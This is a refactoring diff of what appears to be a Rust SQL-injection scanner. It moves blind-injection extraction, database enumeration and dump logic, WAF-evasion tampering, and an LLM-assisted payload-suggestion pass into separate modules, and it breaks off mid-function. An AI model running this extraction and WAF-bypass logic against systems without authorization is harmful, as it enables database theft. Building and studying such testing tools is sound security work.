@@ -26,8 +26,7 @@ use crate::{
         url::TargetUrl,
     },
     techniques::{
-        boolean::detector::BooleanDetector,
-        payload_opts::{PayloadOpts, build_final_payload_with_rng},
+        boolean::detector::BooleanDetector, payload_opts::build_final_payload_with_rng,
         tamper::Tamper,
     },
 };
@@ -97,6 +96,9 @@ pub use super::config::{
     BudgetConfig, EngineConfig, EnumConfig, EvasionConfig, MAX_DETECTION_DURATION_SECS_CAP,
     NetConfig, OobConfig, SecondOrderConfig,
 };
+
+/// `--dbms` hint normalization moved to `super::config` (P1).
+pub(crate) use super::config::dbms_hint_kind;
 
 #[derive(Debug)]
 #[non_exhaustive]
@@ -576,7 +578,11 @@ impl Engine {
                 state=?current,
                 "phase enumeration — dbs/tables/columns/dump"
             );
-            self.run_enumeration(
+            run_enumeration(
+                &self.client,
+                &self.state,
+                &self.cancel,
+                &self.config,
                 &target,
                 target_str,
                 &marker_set,
@@ -781,23 +787,6 @@ impl Engine {
             }
         }
         set
-    }
-
-    /// Normalized `--dbms` hint as `DbmsKind`, if set and recognized.
-    fn dbms_hint_kind(&self) -> Option<crate::dbms::DbmsKind> {
-        let hint = self.config.dbms_hint.as_deref()?;
-        let v = hint.trim().to_ascii_lowercase();
-        match v.as_str() {
-            "mysql" | "mariadb" | "my" => Some(crate::dbms::DbmsKind::MySql),
-            "postgres" | "postgresql" | "pg" | "pgsql" => Some(crate::dbms::DbmsKind::Postgres),
-            "mssql" | "sqlserver" | "sql-server" | "tsql" => Some(crate::dbms::DbmsKind::MsSql),
-            "oracle" | "ora" => Some(crate::dbms::DbmsKind::Oracle),
-            "sqlite" => Some(crate::dbms::DbmsKind::Sqlite),
-            _ => {
-                warn!(dbms=%hint, "unknown --dbms hint, ignoring (auto-fingerprint)");
-                None
-            }
-        }
     }
 
     /// Collects 3 baseline samples, derives the WAF-aware effective tampers/opts.
@@ -1868,8 +1857,8 @@ struct DetectionShared {
 
 /// Detection scheduling helpers moved to `super::schedule` (P1).
 pub(crate) use super::schedule::{
-    build_scheduler_for_param, check_deadline, dbms_payload_label, detection_order,
-    is_technique_enabled, log_scheduler_state, mutation_plan_label, parse_finding_dbms,
+    build_scheduler_for_param, detection_order, is_technique_enabled, log_scheduler_state,
+    mutation_plan_label, parse_finding_dbms,
 };
 
 /// Per-parameter C3+C4 loop: 7 hypotheses seeded by calibrated priors, each
@@ -2517,55 +2506,6 @@ fn infer_signal_and_trials(
 }
 
 impl Engine {
-    /// Passive DBMS guess from error findings + banner regex, filling any
-    /// missing `dbms` on boolean/time findings.
-    /// Recovers the injection point of the first *confirmed* finding (param
-    /// name + location parsed back out of `finding.parameter`), falling back
-    /// to the first finding then to a synthetic `id` query param when there
-    /// is no finding yet. Shared by fingerprint/extraction/enumeration, which
-    /// all reuse the same confirmed injection point.
-    async fn first_finding_param(&self, target: &TargetUrl) -> (TargetParameter, TargetUrl) {
-        let st = self.state.read().await;
-        let findings = st.findings().to_vec();
-        drop(st);
-        // Prefer a confirmed finding so an `0.55 unconfirmed` error never
-        // dictates the oracle injection point when a confirmed finding exists.
-        let f = findings
-            .iter()
-            .find(|x| is_confirmed_finding(x))
-            .or_else(|| findings.first())
-            .cloned();
-        if let Some(finding) = f {
-            // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header").
-            // Split at the LAST '@': parameter names may contain '@' (e.g. email-like
-            // query keys) while locations (`query`/`body`/`cookie`/`header:<name>`)
-            // never do — HTTP header names (RFC 9110 `token`) exclude '@' and ':'.
-            let (name, loc_str) = match finding.parameter.rsplit_once('@') {
-                Some((n, l)) => (n.to_owned(), l.to_owned()),
-                None => (finding.parameter.clone(), "query".to_owned()),
-            };
-            let location = if loc_str == "query" {
-                ParameterLocation::Query
-            } else if loc_str == "body" {
-                ParameterLocation::Body
-            } else if loc_str == "cookie" {
-                ParameterLocation::Cookie
-            } else if let Some(h) = loc_str.strip_prefix("header:") {
-                ParameterLocation::Header(h.to_owned())
-            } else {
-                // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
-                ParameterLocation::Query
-            };
-            (TargetParameter::new(name, location, "1"), target.clone())
-        } else {
-            // fallback synthetic
-            (
-                TargetParameter::new("id", ParameterLocation::Query, "1"),
-                target.clone(),
-            )
-        }
-    }
-
     /// Passive DBMS guess from error findings + banner regex; if both are
     /// inconclusive, falls back to one active differential probe per
     /// candidate DBMS (see [`crate::dbms::common::DbmsDetector::fingerprint_probe`]),
@@ -2609,7 +2549,7 @@ impl Engine {
             .collect();
         // Explicit `--dbms` hint wins over guessing: fill immediately and skip
         // active probing (saves requests, honours operator knowledge).
-        if let Some(hint) = self.dbms_hint_kind() {
+        if let Some(hint) = dbms_hint_kind(&self.config) {
             let mut st = self.state.write().await;
             st.fill_missing_dbms(hint);
             info!(
@@ -2673,7 +2613,7 @@ impl Engine {
         effective_opts: ProbeOpts,
         matcher: &crate::detection::matcher::MatcherConfig,
     ) {
-        let (param, probe_target) = self.first_finding_param(target).await;
+        let (param, probe_target) = first_finding_param(&self.state, target).await;
         // P1.1 — purge des zones dynamiques marquées avant comparaison.
         let baseline_body = matcher
             .pre_process(&baseline.strip_dynamic_content(&baseline.representative_body_str()));
@@ -2848,11 +2788,11 @@ impl Engine {
             }
         }
         // Pick first finding's param as injection point for extraction
-        let (first_param, target_for_extract) = self.first_finding_param(target).await;
+        let (first_param, target_for_extract) = first_finding_param(&self.state, target).await;
 
         // Determine DBMS for extraction query (`--dbms` hint wins).
         // Guess from confirmed findings only (see fingerprint gating).
-        let dbms_kind = if let Some(hint) = self.dbms_hint_kind() {
+        let dbms_kind = if let Some(hint) = dbms_hint_kind(&self.config) {
             hint
         } else {
             let snap = self.state.read().await.findings().to_vec();
@@ -3162,659 +3102,17 @@ impl Engine {
         self.state.write().await.push_extracted(extracted);
         Ok(())
     }
-
-    /// Opt-in enumeration (`--dbs`/`--tables`/`--columns`/`--dump`/`--count`/
-    /// `--banner`/`--current-user`/`--current-db`/`--hostname`), reusing the
-    /// same injection point as extraction.
-    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
-    async fn run_enumeration(
-        &self,
-        target: &TargetUrl,
-        target_str: &str,
-        marker_set: &MarkerSet,
-        raw_request: &Arc<Option<RawRequest>>,
-        baseline: &baseline::Baseline,
-        effective_tampers: &[Tamper],
-        effective_opts: ProbeOpts,
-    ) -> crate::error::Result<()> {
-        if BudgetConfig::is_over_request_budget(
-            self.state.read().await.request_count(),
-            self.config.budget.request_budget,
-        ) {
-            warn!("request-budget spent, skipping enumeration");
-            return Ok(());
-        }
-        // Reuse extraction context (`--dbms` hint wins over guessing).
-        // Guess from confirmed findings only (see fingerprint gating).
-        let (first_param, target_for_extract) = self.first_finding_param(target).await;
-
-        let dbms_kind = if let Some(hint) = self.dbms_hint_kind() {
-            hint
-        } else {
-            let snap = self.state.read().await.findings().to_vec();
-            let confirmed: Vec<Finding> = snap
-                .iter()
-                .filter(|f| is_confirmed_finding(f))
-                .cloned()
-                .collect();
-            crate::dbms::fingerprint::guess_from_findings(&confirmed)
-                .unwrap_or(crate::dbms::DbmsKind::MySql)
-        };
-
-        let detector = crate::dbms::fingerprint::get_detector(dbms_kind);
-
-        let baseline_body = baseline.representative_body_str();
-        let baseline_mean = baseline.mean_ms;
-        let client = self.client.clone();
-        let state = Arc::clone(&self.state);
-        let cancel = self.cancel.clone();
-        let target_str = target_str.to_owned();
-        let marker_set = marker_set.clone();
-        let raw_request_for_enum = raw_request.as_ref().clone();
-
-        let start = self.config.enumeration.start.unwrap_or(0);
-        let stop = self.config.enumeration.stop.unwrap_or(100);
-
-        if self.config.enumeration.dbs {
-            let query = detector.list_databases_query();
-            let extracted = extract_enum_field(
-                &client,
-                &state,
-                &cancel,
-                &target_for_extract,
-                &target_str,
-                &first_param,
-                &marker_set,
-                &baseline_body,
-                baseline_mean,
-                query.clone(),
-                "databases".to_owned(),
-                raw_request_for_enum.as_ref(),
-                effective_tampers,
-                effective_opts,
-                &dbms_kind,
-                &self.config.evasion.payload_opts,
-                &self.config.matcher,
-                &self.config.net.ignore_codes,
-                self.config.seed,
-            )
-            .await?;
-            if let Some(extracted) = extracted {
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
-            }
-        }
-
-        let target_db = self.config.enumeration.db.clone().unwrap_or_default();
-        if self.config.enumeration.tables && !target_db.is_empty() {
-            let query = detector.list_tables_query(&target_db);
-            let extracted = extract_enum_field(
-                &client,
-                &state,
-                &cancel,
-                &target_for_extract,
-                &target_str,
-                &first_param,
-                &marker_set,
-                &baseline_body,
-                baseline_mean,
-                query.clone(),
-                "tables".to_owned(),
-                raw_request_for_enum.as_ref(),
-                effective_tampers,
-                effective_opts,
-                &dbms_kind,
-                &self.config.evasion.payload_opts,
-                &self.config.matcher,
-                &self.config.net.ignore_codes,
-                self.config.seed,
-            )
-            .await?;
-            if let Some(extracted) = extracted {
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
-            }
-        }
-
-        let target_table = self.config.enumeration.table.clone().unwrap_or_default();
-        if self.config.enumeration.columns && !target_db.is_empty() && !target_table.is_empty() {
-            let query = detector.list_columns_query(&target_db, &target_table);
-            let extracted = extract_enum_field(
-                &client,
-                &state,
-                &cancel,
-                &target_for_extract,
-                &target_str,
-                &first_param,
-                &marker_set,
-                &baseline_body,
-                baseline_mean,
-                query.clone(),
-                "columns".to_owned(),
-                raw_request_for_enum.as_ref(),
-                effective_tampers,
-                effective_opts,
-                &dbms_kind,
-                &self.config.evasion.payload_opts,
-                &self.config.matcher,
-                &self.config.net.ignore_codes,
-                self.config.seed,
-            )
-            .await?;
-            if let Some(extracted) = extracted {
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
-            }
-        }
-
-        if self.config.enumeration.dump && !target_db.is_empty() && !target_table.is_empty() {
-            let columns: Vec<String> = self
-                .config
-                .enumeration
-                .column
-                .clone()
-                .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
-                .unwrap_or_default();
-            let query = detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
-            let extracted = extract_enum_field(
-                &client,
-                &state,
-                &cancel,
-                &target_for_extract,
-                &target_str,
-                &first_param,
-                &marker_set,
-                &baseline_body,
-                baseline_mean,
-                query.clone(),
-                "dump".to_owned(),
-                raw_request_for_enum.as_ref(),
-                effective_tampers,
-                effective_opts,
-                &dbms_kind,
-                &self.config.evasion.payload_opts,
-                &self.config.matcher,
-                &self.config.net.ignore_codes,
-                self.config.seed,
-            )
-            .await?;
-            if let Some(extracted) = extracted {
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
-            }
-        }
-
-        if self.config.enumeration.count && !target_db.is_empty() && !target_table.is_empty() {
-            let query = detector.count_rows_query(&target_db, &target_table);
-            let extracted = extract_enum_field(
-                &client,
-                &state,
-                &cancel,
-                &target_for_extract,
-                &target_str,
-                &first_param,
-                &marker_set,
-                &baseline_body,
-                baseline_mean,
-                query.clone(),
-                "count".to_owned(),
-                raw_request_for_enum.as_ref(),
-                effective_tampers,
-                effective_opts,
-                &dbms_kind,
-                &self.config.evasion.payload_opts,
-                &self.config.matcher,
-                &self.config.net.ignore_codes,
-                self.config.seed,
-            )
-            .await?;
-            if let Some(extracted) = extracted {
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
-            }
-        }
-
-        for (flag, query, label) in [
-            (
-                self.config.enumeration.banner,
-                detector.banner_query(),
-                "banner",
-            ),
-            (
-                self.config.enumeration.current_user,
-                detector.current_user_query(),
-                "current_user",
-            ),
-            (
-                self.config.enumeration.current_db,
-                detector.current_db_query(),
-                "current_db",
-            ),
-            (
-                self.config.enumeration.hostname,
-                detector.hostname_query(),
-                "hostname",
-            ),
-        ] {
-            if !flag {
-                continue;
-            }
-            let extracted = extract_enum_field(
-                &client,
-                &state,
-                &cancel,
-                &target_for_extract,
-                &target_str,
-                &first_param,
-                &marker_set,
-                &baseline_body,
-                baseline_mean,
-                query.clone(),
-                label.to_owned(),
-                raw_request_for_enum.as_ref(),
-                effective_tampers,
-                effective_opts,
-                &dbms_kind,
-                &self.config.evasion.payload_opts,
-                &self.config.matcher,
-                &self.config.net.ignore_codes,
-                self.config.seed,
-            )
-            .await?;
-            if let Some(extracted) = extracted {
-                info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
-            }
-        }
-        Ok(())
-    }
 }
 
-/// Probe fetch layer moved to `super::fetch` (P1).
+/// AI-suggest second-pass moved to `super::ai_suggest` (P1).
 /// Re-exported here for intra-engine callers during migration.
-pub(crate) use super::fetch::fetch_for_payload_with_class;
-
-/// `--ai-suggest` second-pass (opt-in post-échec / WAF-block uniquement).
-///
-/// Un seul passage par paramètre et par run (verrou `ai_attempted` partagé
-/// entre le hook détection et le hook post-confirm), seulement si le run est
-/// reparti bredouille face à un signal actionnable : WAF bloquant
-/// (`is_waf_blocked() || is_waf_blocking()`), filtre applicatif (`400`
-/// streak mémorisé par [`SessionState::note_app_filter_hit`]), empreinte WAF
-/// live, ou `--confirm` droppé (`confirm_dropped`, hook post-confirm).
-///
-/// Bornes : 0 appel LLM quand OFF/incomplet/déjà-tenté/annulé/budget/deadline
-/// (fail silencieux), au plus `max_suggestions` paires validées × 2 requêtes
-/// (défaut 3 paires = 6 requêtes/param). Chaque paire passe par le validator
-/// local avant envoi ; l'évaluation reprend `BooleanDetector` + veto matcher
-/// (single-trial, `trials=1/1` en évidence — le confirm 3-trials reste une
-/// option V2). Échec silencieux : aucun finding inventé, finding originel
-/// jamais modifié (aucun n'existe sur ce param par construction du gate).
-#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
-async fn run_ai_suggest_for_param(
-    client: &HttpClient,
-    state: &Arc<RwLock<SessionState>>,
-    cancel: &CancellationToken,
-    config: &EngineConfig,
-    target: &TargetUrl,
-    target_str: &str,
-    param: &TargetParameter,
-    baseline: &baseline::Baseline,
-    marker_set: &MarkerSet,
-    raw: Option<&RawRequest>,
-    tampers: &[Tamper],
-    opts: ProbeOpts,
-    popts: &PayloadOpts,
-    matcher: &crate::detection::matcher::MatcherConfig,
-    ignore_codes: &[u16],
-    seed: Option<u64>,
-    context: &InjectionContext,
-    dbms_belief: &DbmsBelief,
-    deadline: Option<std::time::Instant>,
-    confirm_dropped: bool,
-) {
-    use crate::ai::{
-        AiSuggestConfig, ai_hard_stop, ai_plan_label, ai_trigger, should_attempt_ai_suggest,
-    };
-    let ai: &AiSuggestConfig = &config.ai;
-    if !ai.enabled {
-        return;
-    }
-    let param_key = param.key();
-    // Gate synchrone (0 requête) : findings vides sur ce param + trigger +
-    // verrous (budget/deadline/cancel/origine down/boolean désactivé).
-    let findings_empty = !state
-        .read()
-        .await
-        .findings()
-        .iter()
-        .any(|f| f.parameter == param_key);
-    let waf_signal = baseline.is_waf_blocked() || baseline.is_waf_blocking();
-    let filter_hit = state.read().await.app_filter_hit(&param_key);
-    // Empreinte WAF live en phase détection : un WAF qui ne bloque que les
-    // payloads (baseline 200 propre) ne laisse aucun signal baseline, mais
-    // chaque sonde bloquée est mémorisée par param dans
-    // `fetch_for_payload_with_class` (les compteurs `detectability` ne sont
-    // absorbés qu'en fin de run — trop tard pour ce hook).
-    let live_waf_hit = state.read().await.waf_hit(&param_key);
-    let trigger = ai_trigger(waf_signal, filter_hit, confirm_dropped) || live_waf_hit;
-    let budget_spent = BudgetConfig::is_over_request_budget(
-        state.read().await.request_count(),
-        config.budget.request_budget,
-    );
-    let hard_stop = ai_hard_stop(
-        baseline_all_error(&baseline.status_codes),
-        budget_spent,
-        BudgetConfig::is_past_deadline(deadline),
-        cancel.is_cancelled(),
-        !is_technique_enabled(&config.techniques, TechniqueKind::Boolean),
-    );
-    if !should_attempt_ai_suggest(ai.enabled, findings_empty, trigger, hard_stop) {
-        return;
-    }
-    if !ai.is_complete() {
-        debug!(param = param_key, "ai-suggest skipped: incomplete config");
-        return;
-    }
-    // Verrou un-passage-par-param : le hook détection et le hook
-    // post-confirm partagent ce verrou (un fetch échoué ne retente pas —
-    // borné avant persistant, documenté).
-    if state.read().await.has_ai_attempted(&param_key) {
-        return;
-    }
-    state.write().await.note_ai_attempted(&param_key);
-    info!(
-        param = param_key,
-        provider = ai.provider.map(crate::ai::AiProviderKind::name),
-        waf_signal,
-        filter_hit,
-        "ai-suggest second-pass start (bounded, silent on failure)"
-    );
-    // Signaux abstraits uniquement (0 secret) + squelettes des paires L1
-    // historiques pour interdire au LLM de les répéter à l'identique.
-    let failed_shapes: Vec<String> =
-        crate::techniques::boolean::payloads::boolean_payloads_for(dbms_payload_label(dbms_belief))
-            .iter()
-            .take(2)
-            .map(|p| {
-                crate::ai::prompt::skeletonize(&format!("{} / {}", p.true_payload, p.false_payload))
-            })
-            .collect();
-    let signals = crate::ai::prompt::AiSignals::collect(
-        context,
-        dbms_belief,
-        baseline.waf_vendor.as_deref(),
-        &baseline.waf_hits,
-        baseline.is_waf_blocking(),
-        &failed_shapes,
-        &context.comment.to_string(),
-    );
-    let system = crate::ai::prompt::system_prompt();
-    let user = crate::ai::prompt::build_user_prompt(&signals, ai.max_suggestions);
-    let Some(provider) = ai.provider else {
-        return;
-    };
-    let suggested = match crate::ai::provider::fetch_suggestions(ai, system, &user, cancel).await {
-        Ok(pairs) => pairs,
-        Err(e) => {
-            debug!(param = param_key, error = %e, "ai-suggest fetch failed, skipping silently");
-            return;
-        }
-    };
-    // Cohérence WAF-bypass (ex. auto space2comment) sans casser le
-    // différentiel TRUE/FALSE : tampers effectifs filtrés boolean-safe, comme
-    // `confirm_error_with_boolean`. RNG seedé : même seed → mêmes variantes.
-    let mut rng = crate::seeded_rng::make_rng(seed);
-    let safe_trans: Vec<Tamper> = tampers
-        .iter()
-        .filter(|t| t.is_boolean_safe())
-        .cloned()
-        .collect();
-    let tamper_label = if safe_trans.is_empty() {
-        "none".to_owned()
-    } else {
-        safe_trans
-            .iter()
-            .map(super::super::techniques::tamper::Tamper::name)
-            .collect::<Vec<_>>()
-            .join(",")
-    };
-    let detector = BooleanDetector::new();
-    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
-    let mut tried: std::collections::HashSet<String> = std::collections::HashSet::new();
-    let mut validated: u8 = 0;
-    for (idx, pair) in suggested.iter().enumerate() {
-        if cancel.is_cancelled() || check_deadline(deadline, &param_key, "ai-suggest") {
-            break;
-        }
-        if validated >= ai.max_suggestions {
-            break;
-        }
-        if BudgetConfig::is_over_request_budget(
-            state.read().await.request_count(),
-            config.budget.request_budget,
-        ) {
-            debug!(param = param_key, "ai-suggest stopping on request-budget");
-            break;
-        }
-        let Ok(valid) =
-            crate::ai::validator::validate_ai_pair(&pair.true_branch, &pair.false_branch, &tried)
-        else {
-            debug!(
-                param = param_key,
-                index = idx,
-                "ai-suggest pair rejected by validator"
-            );
-            continue;
-        };
-        tried.insert(valid.true_payload.clone());
-        tried.insert(valid.false_payload.clone());
-        validated = validated.saturating_add(1);
-        let true_payload =
-            build_final_payload_with_rng(&valid.true_payload, &safe_trans, popts, &mut rng);
-        let false_payload =
-            build_final_payload_with_rng(&valid.false_payload, &safe_trans, popts, &mut rng);
-        let plan = ai_plan_label(provider, validated.saturating_sub(1));
-        let (true_raw, true_ms, true_status) = fetch_for_payload_with_class(
-            client,
-            state,
-            cancel,
-            target,
-            target_str,
-            param,
-            &true_payload,
-            marker_set,
-            raw,
-            opts,
-            popts,
-            RequestClass::Boolean,
-        )
-        .await;
-        let true_body = matcher.pre_process(&true_raw);
-        let (false_raw, false_ms, false_status) = fetch_for_payload_with_class(
-            client,
-            state,
-            cancel,
-            target,
-            target_str,
-            param,
-            &false_payload,
-            marker_set,
-            raw,
-            opts,
-            popts,
-            RequestClass::Boolean,
-        )
-        .await;
-        let false_body = matcher.pre_process(&false_raw);
-        // Transport/ignore/filtre : jamais scoré, jamais de finding (même
-        // rigueur que `test_boolean_bounded`, en single-trial ici).
-        if true_status == 0 || false_status == 0 {
-            push_ai_trace(
-                state,
-                &param_key,
-                &plan,
-                seed,
-                0.2,
-                2.0,
-                &valid.true_payload,
-                &valid.false_payload,
-            )
-            .await;
-            continue;
-        }
-        if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
-            push_ai_trace(
-                state,
-                &param_key,
-                &plan,
-                seed,
-                0.2,
-                2.0,
-                &valid.true_payload,
-                &valid.false_payload,
-            )
-            .await;
-            continue;
-        }
-        if is_app_filter_block(true_status, false_status) {
-            push_ai_trace(
-                state,
-                &param_key,
-                &plan,
-                seed,
-                0.2,
-                2.0,
-                &valid.true_payload,
-                &valid.false_payload,
-            )
-            .await;
-            continue;
-        }
-        let res = detector.evaluate(
-            &baseline_body,
-            &true_body,
-            &false_body,
-            baseline.mean_ms,
-            true_ms,
-            false_ms,
-        );
-        if !res.is_vulnerable
-            || matcher.gate_boolean(&true_body, &false_body, true_status, false_status)
-                == Some(false)
-        {
-            push_ai_trace(
-                state,
-                &param_key,
-                &plan,
-                seed,
-                res.confidence.min(0.2),
-                2.0,
-                &valid.true_payload,
-                &valid.false_payload,
-            )
-            .await;
-            continue;
-        }
-        let fp = (1.0 - res.confidence).clamp(0.0, 1.0);
-        let evidence = format!(
-            "boolean true_sim={:.2} false_sim={:.2} trials=1/1 fp={fp:.2} tamper={tamper_label} {plan}{}",
-            res.true_similarity,
-            res.false_similarity,
-            matcher.evidence_suffix(),
-        );
-        let finding = Finding::new(
-            target.as_str(),
-            param_key.clone(),
-            TechniqueKind::Boolean,
-            res.confidence,
-            evidence,
-        )
-        .with_false_positive_prob(fp)
-        .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
-        let mut finding = finding;
-        finding.dbms = None;
-        state.write().await.push_finding(finding);
-        push_ai_trace(
-            state,
-            &param_key,
-            &plan,
-            seed,
-            res.confidence,
-            2.0,
-            &valid.true_payload,
-            &valid.false_payload,
-        )
-        .await;
-        info!(
-            param = param_key,
-            plan,
-            confidence = res.confidence,
-            "ai-suggest confirmed finding"
-        );
-        break;
-    }
-}
-
-/// Trace hashes-only d'une paire IA sondée (jamais de payload en clair).
-#[allow(clippy::too_many_arguments)]
-async fn push_ai_trace(
-    state: &Arc<RwLock<SessionState>>,
-    param_key: &str,
-    plan: &str,
-    seed: Option<u64>,
-    posterior: f64,
-    cost: f64,
-    true_payload: &str,
-    false_payload: &str,
-) {
-    let mut st = state.write().await;
-    let seq = st.next_trace_seq();
-    let req_hash = crate::reasoning::trace::hash_str_hex(&format!(
-        "{param_key}:ai:{plan}:{}",
-        seed.map_or("none".to_owned(), |s| s.to_string())
-    ));
-    let resp_hash = crate::reasoning::trace::hash_str_hex(&format!(
-        "{param_key}:ai:{plan}:t={}f={}",
-        crate::session::scrubber::Scrubber::hash_truncated(true_payload),
-        crate::session::scrubber::Scrubber::hash_truncated(false_payload),
-    ));
-    st.push_trace(crate::reasoning::ProbeRecord::new(
-        seq,
-        param_key.to_owned(),
-        TechniqueKind::Boolean.to_string(),
-        plan.to_owned(),
-        seed,
-        req_hash,
-        resp_hash,
-        posterior.clamp(0.0, 1.0),
-        cost,
-    ));
-}
+pub(crate) use super::ai_suggest::run_ai_suggest_for_param;
 
 /// Confirmation second-pass + mini-mutation moved to `super::confirm` (P1).
 /// Only the items used by the orchestrator body/tests are re-exported here;
 /// the rest stay at `crate::engine::confirm::`.
 pub(crate) use super::confirm::{
-    confirm_finding_second_pass, has_confirmed_finding, is_confirmed_finding,
+    confirm_finding_second_pass, first_finding_param, has_confirmed_finding, is_confirmed_finding,
     is_extraction_eligible, param_from_finding, run_mutation_for_finding,
 };
 /// Detection probes moved to `super::probes` (P1).
@@ -3824,247 +3122,21 @@ pub(crate) use super::probes::{
     test_oob_bounded, test_stacked_bounded, test_time_bounded, test_union_bounded,
 };
 
-/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind `SQLi`.
-/// Uses binary search on ASCII values with the provided query.
-/// Dialect-aware: length/char comparison built from `DbmsKind`
-/// (`LEN` on MSSQL, `SUBSTR` on Oracle, `::text` cast on Postgres).
-#[allow(clippy::too_many_arguments)]
-#[allow(clippy::too_many_lines)]
-async fn extract_enum_field(
-    client: &HttpClient,
-    state: &Arc<RwLock<SessionState>>,
-    cancel: &CancellationToken,
-    target: &TargetUrl,
-    target_str: &str,
-    param: &TargetParameter,
-    marker_set: &MarkerSet,
-    baseline_body: &str,
-    baseline_mean: f64,
-    query: String,
-    label: String,
-    raw: Option<&RawRequest>,
-    tampers: &[Tamper],
-    opts: ProbeOpts,
-    dbms_kind: &crate::dbms::DbmsKind,
-    popts: &PayloadOpts,
-    matcher: &crate::detection::matcher::MatcherConfig,
-    _ignore_codes: &[u16],
-    seed: Option<u64>,
-) -> Result<Option<String>, crate::error::InjektError> {
-    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
-    // `None` preserves the historical OS-random behaviour.
-    let mut rng = crate::seeded_rng::make_rng(seed);
-    let engine = crate::extraction::engine::ExtractionEngine::new(
-        crate::extraction::engine::ExtractionConfig::default(),
-    );
-
-    // Single source of truth for dialect SQL: reuse the `DbmsDetector`
-    // `length_expr` / `ascii_cmp_expr` impls instead of re-matching on kind.
-    let detector = crate::dbms::common::detector_for_kind(dbms_kind);
-    // Matcher pre-processing (`--text-only` strips HTML) is applied to both
-    // baseline and fetched bodies before `diff_against_baseline` so the
-    // comparison stays consistent. No veto by `--code`/`--string` here:
-    // enumeration is detection-only (a veto would only hide data). Likewise
-    // `_ignore_codes` is intentionally not honored: an ignored status still
-    // carries the length/char differential, and skipping the guess would
-    // truncate inference (`inferred_len` under-estimate). The parameter is
-    // kept (prefixed `_`) so a future policy change needs no re-plumbing
-    // of the 6 callers.
-    let baseline_proc = matcher.pre_process(baseline_body);
-
-    // First infer length (max 500 chars for enum results).
-    // Transport/body errors are never scored: the guess is skipped (no
-    // break, no length update) so a transient blip cannot truncate
-    // inference. Persistent failure aborts gracefully with `Ok(None)`.
-    let mut inferred_len = 0;
-    let mut consecutive_errors = 0usize;
-    for len_guess in 1..=500 {
-        if cancel.is_cancelled() {
-            break;
-        }
-        let base = format!("' AND {}>={len_guess} -- -", detector.length_expr(&query));
-        let payload = build_final_payload_with_rng(&base, tampers, popts, &mut rng);
-        let Some(spec) = build_injection_spec_with_raw(
-            target, target_str, param, &payload, marker_set, raw, opts, popts,
-        ) else {
-            warn!(label=%label, len_guess, "enum probe spec build failed, skipping guess");
-            continue;
-        };
-        let start = std::time::Instant::now();
-        let resp = client.send_with_retry(spec, cancel).await;
-        let ms = start.elapsed().as_secs_f64() * 1000.0;
-        state.write().await.increment_requests();
-        let raw_body = match resp {
-            Ok(r) => match client.read_body_string_with_timeout(r).await {
-                Ok(b) => b,
-                Err(e) => {
-                    warn!(error=%e, label=%label, len_guess, "enum probe body read failed, skipping guess");
-                    consecutive_errors += 1;
-                    if consecutive_errors >= 5 {
-                        warn!(label=%label, "enum aborted after 5 consecutive transport errors");
-                        return Ok(None);
-                    }
-                    continue;
-                }
-            },
-            Err(e) => {
-                warn!(error=%e, label=%label, len_guess, "enum probe failed, skipping guess");
-                consecutive_errors += 1;
-                if consecutive_errors >= 5 {
-                    warn!(label=%label, "enum aborted after 5 consecutive transport errors");
-                    return Ok(None);
-                }
-                continue;
-            }
-        };
-        consecutive_errors = 0;
-        let body = matcher.pre_process(&raw_body);
-        let diff = crate::detection::response_diff::diff_against_baseline(
-            &baseline_proc,
-            &body,
-            baseline_mean,
-            ms,
-            100.0,
-        );
-        if diff.confidence < 0.4 {
-            inferred_len = len_guess;
-        } else {
-            break;
-        }
-    }
-    if inferred_len == 0 {
-        warn!(label=%label, "enumeration length inference failed");
-        return Ok(None);
-    }
-
-    let client_clone = client.clone();
-    let state_clone = Arc::clone(state);
-    let cancel_clone = cancel.clone();
-    let target_clone = target.clone();
-    let target_str_clone = target_str.to_owned();
-    let param_clone = param.clone();
-    let marker_set_clone = marker_set.clone();
-    let baseline_body_clone = baseline_proc.clone();
-    let baseline_mean_clone = baseline_mean;
-    let query_for_oracle = query.clone();
-    let raw_for_oracle = raw.cloned();
-    let tampers_for_oracle = tampers.to_vec();
-    let dbms_for_oracle = *dbms_kind;
-    let popts_for_oracle = (*popts).clone();
-    let matcher_for_oracle = matcher.clone();
-    let seed_for_oracle = seed;
-
-    let oracle = move |pos: usize, mid: u8| {
-        let client = client_clone.clone();
-        let state = state_clone.clone();
-        let cancel = cancel_clone.clone();
-        let target = target_clone.clone();
-        let target_str = target_str_clone.clone();
-        let param = param_clone.clone();
-        let marker_set = marker_set_clone.clone();
-        let baseline_body = baseline_body_clone.clone();
-        let query = query_for_oracle.clone();
-        let raw = raw_for_oracle.clone();
-        let tampers = tampers_for_oracle.clone();
-        let dbms_kind = dbms_for_oracle;
-        let popts = popts_for_oracle.clone();
-        let matcher = matcher_for_oracle.clone();
-        let seed = seed_for_oracle;
-        async move {
-            let detector = crate::dbms::common::detector_for_kind(&dbms_kind);
-            let cmp = detector.ascii_cmp_expr(&query, pos, mid);
